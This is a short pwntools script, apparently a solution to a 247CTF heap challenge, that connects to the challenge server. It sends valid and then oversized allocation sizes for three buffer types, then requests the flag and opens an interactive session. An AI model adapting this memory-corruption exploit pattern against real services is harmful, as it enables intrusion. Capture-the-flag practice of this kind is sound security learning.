#!/bin/python3

from pwn import *

p = remote('f77c3f5d93ac5bc7.247ctf.com', 50384)

def alloc_and_free(command: str):

    good_size, bad_size = 10, 1000
    message = b'iiii' # Useless

    p.sendline(command.encode())
    p.sendline(str(good_size).encode())
    p.sendline(message)

    p.sendline(command.encode())
    p.sendline(str(bad_size).encode())

alloc_and_free("small")
alloc_and_free("medium")
alloc_and_free("large")

p.sendline(b'flag')
p.interactive()

